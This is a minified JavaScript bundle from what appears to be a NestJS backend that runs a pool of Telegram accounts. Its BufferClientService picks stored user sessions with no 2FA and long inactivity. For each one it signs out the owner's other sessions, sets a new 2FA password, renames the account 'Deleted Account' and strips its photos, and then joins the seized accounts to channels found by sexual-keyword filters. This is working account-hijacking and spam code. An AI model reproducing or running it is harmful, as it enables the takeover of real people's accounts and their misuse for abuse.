r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientModule=void 0;const r=o(3563),n=o(5839),a=o(4374),s=o(5853),c=o(9035),l=o(282),p=o(3322),d=o(7422),u=o(8009),f=o(5774),y=o(1324),m=o(1373);let h=class{};t.BufferClientModule=h,t.BufferClientModule=h=i([(0,r.Module)({imports:[f.initModule,n.MongooseModule.forFeature([{name:"bufferClientModule",schema:c.BufferClientSchema,collection:"bufferClients"}]),(0,r.forwardRef)((()=>l.TelegramModule)),(0,r.forwardRef)((()=>d.UsersModule)),(0,r.forwardRef)((()=>p.ActiveChannelsModule)),(0,r.forwardRef)((()=>u.ClientModule)),(0,r.forwardRef)((()=>y.ChannelsModule)),(0,r.forwardRef)((()=>m.PromoteClientModule))],controllers:[s.BufferClientController],providers:[a.BufferClientService],exports:[a.BufferClientService]})],h)},4374:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientService=void 0;const a=o(9597),s=o(3563),c=o(5839),l=o(6037),p=o(2995),d=o(7385),u=o(9127),f=o(9155),y=o(6185),m=o(5562),h=o(1870);let g=class{constructor(e,t,o,i,r,n,a){this.bufferClientModel=e,this.telegramService=t,this.usersService=o,this.activeChannelsService=i,this.clientService=r,this.channelsService=n,this.promoteClientService=a,this.joinChannelMap=new Map}async create(e){return new this.bufferClientModel(e).save()}async findAll(){return this.bufferClientModel.find().exec()}async findOne(e,t=!0){const o=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();if(!o&&t)throw new s.NotFoundException(`BufferClient with mobile ${e} not found`);return o}async update(e,t){const o=await this.bufferClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!o)throw new s.NotFoundException(`User with mobile ${e} not found`);return o}async createOrUpdate(e,t){const o=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();return o?(console.log("Updating"),this.update(o.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,y.fetchWithTimeout)(`${(0,y.ppplbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${e}`)}`),0===(await this.bufferClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new s.NotFoundException(`BufferClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.bufferClientModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const r=this.bufferClientModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}removeFromBufferMap(e){this.joinChannelMap.delete(e)}clearBufferMap(){console.log("BufferMap cleared"),this.joinChannelMap.clear()}async joinchannelForBufferClients(e=!0){if(!this.telegramService.getActiveClientSetup()){console.log("Joining Channel Started"),await this.telegramService.disconnectAll(),this.clearJoinChannelInterval(),await(0,d.sleep)(2e3);const t=e?[]:Array.from(this.joinChannelMap.keys()),o=await this.bufferClientModel.find({channels:{$lt:350},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(o.length>0){for(const e of o)try{const t=await this.telegramService.createClient(e.mobile,!1,!1);console.log("Started Joining for : ",e.mobile);const o=await t.channelInfo(!0);console.log("Existing Channels Length : ",o.ids.length),await this.update(e.mobile,{channels:o.ids.length});let i=[];o.canSendFalseCount<50?(i=o.ids.length<220?await this.channelsService.getActiveChannels(150,0,o.ids):await this.activeChannelsService.getActiveChannels(150,0,o.ids),this.joinChannelMap.set(e.mobile,i),await this.telegramService.deleteClient(e.mobile)):t.leaveChannels(o.canSendFalseChats)}catch(t){await this.telegramService.deleteClient(e.mobile),(0,y.parseError)(t)}this.joinChannelQueue()}return console.log("Joining Channel Triggered Succesfully for ",o.length),`Initiated Joining channels ${o.length}`}console.log("ignored active check buffer channels as active client setup exists")}async joinChannelQueue(){Array.from(this.joinChannelMap.keys()).length>0&&(this.joinChannelIntervalId=setInterval((async()=>{const e=Array.from(this.joinChannelMap.keys());if(e.length>0){console.log("In JOIN CHANNEL interval: ",(new Date).toISOString());for(const t of e){const e=this.joinChannelMap.get(t);if(e&&e.length>0){const o=e.shift();console.log(t," Pending Channels :",e.length),this.joinChannelMap.set(t,e);try{await this.telegramService.createClient(t,!1,!1),console.log(t," Trying to join :",o.username),await this.telegramService.tryJoiningChannel(t,o)}catch(e){await this.telegramService.deleteClient(t);const i=(0,y.parseError)(e,`${t} @${o.username} Outer Err ERR: `);"CHANNELS_TOO_MUCH"!=e.errorMessage&&"FloodWaitError"!=i.error||(this.removeFromBufferMap(t),await this.telegramService.getChannelInfo(t,!0))}await this.telegramService.deleteClient(t)}else this.joinChannelMap.delete(t)}}else this.clearJoinChannelInterval()}),24e4))}clearJoinChannelInterval(){this.joinChannelIntervalId&&(clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,setTimeout((()=>{this.joinchannelForBufferClients(!1)}),3e4))}async setAsBufferClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){if(!(await this.usersService.search({mobile:e}))[0])throw new s.BadRequestException("user not found");if(await this.findOne(e,!1))throw new s.ConflictException("BufferClient already exist");const o=await this.clientService.findAll(),i=o.map((e=>e?.mobile));if(o.flatMap((e=>e?.promoteMobile)).includes(e)||i.includes(e))throw new s.BadRequestException("Number is a Active Client");try{const t=await this.telegramService.createClient(e,!1);await t.set2fa(),await(0,d.sleep)(15e3),await t.updateUsername(""),await(0,d.sleep)(3e3),await t.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await t.updateProfile("Deleted Account","Deleted Account")}catch(e){const t=(0,y.parseError)(e);throw new s.HttpException(t.message,parseInt(t.status))}return await this.telegramService.deleteClient(e),"Client set as buffer successfully"}async checkBufferClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check buffer channels as active client setup exists");else{await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const e=await this.findAll();let t=[],o=[];if(e.length<70)for(let t=0;t<70-e.length;t++)o.push(t.toString());const i=await this.clientService.findAll(),r=await this.promoteClientService.findAll(),n=[...i.map((e=>e.mobile)),...i.flatMap((e=>e.promoteMobile))],a=r.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const i of e)if(n.includes(i.mobile)||a.includes(i.mobile))console.log("Number is a Active Client"),t.push(i.mobile),this.remove(i.mobile);else try{const e=await this.telegramService.createClient(i.mobile,!0,!1),r=await e.getMe();r.username&&(await this.telegramService.updateUsername(i.mobile,""),await(0,d.sleep)(2e3)),"Deleted Account"!==r.firstName&&(await this.telegramService.updateNameandBio(i.mobile,"Deleted Account",""),await(0,d.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(i.mobile),await e.hasPassword()?(console.log(i.mobile," :  ALL Good"),t.push(i.mobile)):(console.log("Client does not have password"),o.push(i.mobile)),await this.telegramService.deleteClient(i.mobile),await(0,d.sleep)(2e3)}catch(e){(0,y.parseError)(e),o.push(i.mobile),this.remove(i.mobile),await this.telegramService.deleteClient(i.mobile)}t=[...t,...n,...a],console.log("GoodIds: ",t.length,"BadIds : ",o.length),this.addNewUserstoBufferClients(o,t)}}async addNewUserstoBufferClients(e,t){const o=new Date(Date.now()-7776e6).toISOString().split("T")[0],i=await this.usersService.executeQuery({mobile:{$nin:t},expired:!1,twoFA:!1,lastActive:{$lt:o},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New buffer documents to be added: ",i.length);e.length>0&&i.length>0;){const t=i.shift();try{try{const o=await this.telegramService.createClient(t.mobile,!1),i=await o.hasPassword();if(console.log("hasPassword: ",i),i)console.log("Failed to Update as BufferClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await this.telegramService.deleteClient(t.mobile);else{await o.removeOtherAuths(),await o.set2fa(),console.log("waiting for setting 2FA"),await(0,d.sleep)(3e4),await o.updateUsername(""),await(0,d.sleep)(3e3),await o.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await o.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await o.deleteProfilePhotos(),await(0,d.sleep)(2e3),await this.telegramService.removeOtherAuths(t.mobile);const i=await o.channelInfo(!0);console.log("Inserting Document");const r={tgId:t.tgId,session:t.session,mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:i.ids.length};await this.create(r),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created BufferClient============="),await this.telegramService.deleteClient(t.mobile),e.pop()}}catch(e){(0,y.parseError)(e),await this.telegramService.deleteClient(t.mobile)}}catch(e){(0,y.parseError)(e),console.error("An error occurred:",e)}await this.telegramService.deleteClient(t.mobile)}setTimeout((()=>{this.joinchannelForBufferClients()}),12e4)}};t.BufferClientService=g,t.BufferClientService=g=i([(0,s.Injectable)(),n(0,(0,c.InjectModel)("bufferClientModule")),n(1,(0,s.Inject)((0,s.forwardRef)((()=>p.TelegramService)))),n(2,(0,s.Inject)((0,s.forwardRef)((()=>u.UsersService)))),n(3,(0,s.Inject)((0,s.forwardRef)((()=>f.ActiveChannelsService)))),n(4,(0,s.Inject)((0,s.forwardRef)((()=>m.ClientService)))),n(5,(0,s.Inject)((0,s.forwardRef)((()=>f.ActiveChannelsService)))),n(6,(0,s.Inject)((0,s.forwardRef)((()=>h.PromoteClientService)))),r("design:paramtypes",[l.Model,p.TelegramService,u.UsersService,f.ActiveChannelsService,m.ClientService,a.ChannelsService,h.PromoteClientService])],g)},9139:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateBufferClientDto=void 0;const n=o(9742),a=o(7403);class s{}t.CreateBufferClientDto=s,i([(0,n.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"tgId",void 0),i([(0,n.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"mobile",void 0),i([(0,n.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"availableDate",void 0),i([(0,n.ApiProperty)({description:"Session identifier",example:"session123"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"session",void 0),i([(0,n.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),r("design:type",Number)],s.prototype,"channels",void 0)},2843:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchBufferClientDto=void 0;const n=o(9742),a=o(7403);class s{}t.SearchBufferClientDto=s,i([(0,n.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"tgId",void 0),i([(0,n.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"mobile",void 0),i([(0,n.ApiPropertyOptional)({description:"availableDate of the bufferClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"availableDate",void 0),i([(0,n.ApiPropertyOptional)({description:"Session identifier",example:"session123"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"session",void 0),i([(0,n.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),r("design:type",Number)],s.prototype,"channels",void 0)},5042:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateBufferClientDto=void 0;const i=o(9742),r=o(9139);class n extends((0,i.PartialType)(r.CreateBufferClientDto)){}t.UpdateBufferClientDto=n},9035:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientSchema=t.BufferClient=void 0;const n=o(5839);let a=class{};t.BufferClient=a,i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"tgId",void 0),i([(0,n.Prop)({required:!0,unique:!0}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"session",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"availableDate",void 0),i([(0,n.Prop)({required:!0,type:Number}),r("design:type",Number)],a.prototype,"channels",void 0),t.BufferClient=a=i([(0,n.Schema)({collection:"bufferClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.BufferClientSchema=n.SchemaFactory.createForClass(a)},4185:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildController=void 0;const a=o(3563),s=o(9742),c=o(4362);let l=class{constructor(e){this.buildService=e}async findOne(){return this.buildService.findOne()}async update(e){return this.buildService.update(e)}};t.BuildController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get build data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update build"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],l.prototype,"update",null),t.BuildController=l=i([(0,s.ApiTags)("Build"),(0,a.Controller)("builds"),r("design:paramtypes",[c.BuildService])],l)},3177:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildModule=void 0;const r=o(3563),n=o(5839),a=o(4362),s=o(4185),c=o(6877),l=o(889);let p=class{};t.BuildModule=p,t.BuildModule=p=i([(0,r.Global)(),(0,r.Module)({imports:[p,n.MongooseModule.forFeature([{name:"buildModule",collection:"builds",schema:c.BuildSchema}]),l.NpointModule],providers:[a.BuildService],controllers:[s.BuildController],exports:[p]})],p)},4362:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(6954);let p=class{constructor(e,t){this.buildModel=e,this.npointSerive=t}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.buildModel.findOne({}).exec();if(!e)throw new a.NotFoundException("buildModel not found");return e}async update(e){delete e._id;const t=await this.buildModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();try{await this.npointSerive.updateDocument("3375d15db1eece560188",t),console.log("Updated document successfully in npoint")}catch(e){console.log(e)}if(!t)throw new a.NotFoundException("buildModel not found");return t}};t.BuildService=p,t.BuildService=p=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("buildModule")),r("design:paramtypes",[c.Model,l.NpointService])],p)},6877:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildSchema=t.Build=void 0;const n=o(5839),a=r(o(6037));let s=class{};t.Build=s,t.Build=s=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.BuildSchema=n.SchemaFactory.createForClass(s),t.BuildSchema.add({type:a.default.Schema.Types.Mixed})},4288:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsController=void 0;const a=o(3563),s=o(9597),c=o(9742),l=o(6847),p=o(5127),d=o(1734);let u=class{constructor(e){this.channelsService=e}async create(e){return this.channelsService.create(e)}async createMultiple(e){return this.channelsService.createMultiple(e)}search(e){return console.log(e),this.channelsService.search(e)}async findAll(){return this.channelsService.findAll()}async findOne(e){return this.channelsService.findOne(e)}async update(e,t){return this.channelsService.update(e,t)}async remove(e){return this.channelsService.remove(e)}};t.ChannelsController=u,i([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new  channel"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[p.CreateChannelDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Post)("createMultiple"),(0,c.ApiOperation)({summary:"Create multiple channels"}),(0,c.ApiBody)({type:[p.CreateChannelDto]}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Array]),r("design:returntype",Promise)],u.prototype,"createMultiple",null),i([(0,a.Get)("search"),(0,c.ApiOperation)({summary:"Search channels by filters"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[l.SearchChannelDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all  channels"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":channelId"),(0,c.ApiOperation)({summary:"Get an  channel by channelId"}),n(0,(0,a.Param)("channelId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":channelId"),(0,c.ApiOperation)({summary:"Update an  channel by channelId"}),n(0,(0,a.Param)("channelId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateChannelDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":channelId"),(0,c.ApiOperation)({summary:"Delete an  channel by channelId"}),n(0,(0,a.Param)("channelId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),t.ChannelsController=u=i([(0,c.ApiTags)("Channels"),(0,a.Controller)("channels"),r("design:paramtypes",[s.ChannelsService])],u)},1324:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsModule=void 0;const r=o(3563),n=o(5839),a=o(9597),s=o(4288),c=o(8029),l=o(5774);let p=class{};t.ChannelsModule=p,t.ChannelsModule=p=i([(0,r.Module)({imports:[l.initModule,n.MongooseModule.forFeature([{name:c.Channel.name,schema:c.ChannelSchema}])],controllers:[s.ChannelsController],providers:[a.ChannelsService],exports:[a.ChannelsService]})],p)},9597:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(8029);let p=class{constructor(e){this.ChannelModel=e,console.log(l.Channel.name)}async create(e){return new this.ChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.ChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.ChannelModel.find().exec()}async findOne(e){const t=(await this.ChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return await this.ChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){await this.ChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.ChannelModel.find(e).exec()}async getChannels(e=50,t=0,o=[],i=[]){const r=new RegExp(o.join("|"),"i"),n=new RegExp("online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser","i");let a={$and:[{username:{$ne:null}},{$or:[{title:{$regex:r}},{username:{$regex:r}}]},{username:{$not:{$regex:"^("+i.map((e=>"(?i)"+e?.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")))?.join("|")+")$"}}},{title:{$not:{$regex:n}}},{username:{$not:{$regex:n}}},{sendMessages:!1,broadcast:!1,restricted:!1}]};const s={participantsCount:"desc"};try{return await this.ChannelModel.find(a).sort(s).skip(t).limit(e).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,o){try{if(!e)throw new a.BadRequestException("Query is invalid.");const i=this.ChannelModel.find(e);return t&&i.sort(t),o&&i.limit(o),await i.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async getActiveChannels(e=50,t=0,o=[]){const i={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:o},participantsCount:{$gt:1e3},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},r=(o.length,{participantsCount:-1});try{return await this.ChannelModel.aggregate([{$match:i},{$skip:t},{$limit:e},{$addFields:{randomField:{$rand:{}}}},{$sort:r},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}};t.ChannelsService=p,t.ChannelsService=p=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)(l.Channel.name)),r("design:paramtypes",[c.Model])],p)},5127:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateChannelDto=void 0;const n=o(9742);class a{constructor(){this.private=!1,this.forbidden=!1}}t.CreateChannelDto=a,i([(0,n.ApiProperty)({description:"Unique identifier for the channel",example:"803387987"}),r("design:type",String)],a.prototype,"channelId",void 0),i([(0,n.ApiProperty)({description:"Whether the channel is a broadcast channel",example:null,required:!1}),r("design:type",Boolean)],a.prototype,"broadcast",void 0),i([(0,n.ApiProperty)({description:"Indicates if the channel can send messages",example:!0}),r("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,n.ApiProperty)({description:"Whether the channel is a megagroup",example:null,required:!1}),r("design:type",Boolean)],a.prototype,"megagroup",void 0),i([(0,n.ApiProperty)({description:"Number of participants in the channel",example:0}),r("design:type",Number)],a.prototype,"participantsCount",void 0),i([(0,n.ApiProperty)({description:"Whether the channel is restricted",example:null,required:!1}),r("design:type",Boolean)],a.prototype,"restricted",void 0),i([(0,n.ApiProperty)({description:"Whether the channel can send messages",example:null,required:!1}),r("design:type",Boolean)],a.prototype,"sendMessages",void 0),i([(0,n.ApiProperty)({description:"Title of the channel",example:"Earn money with 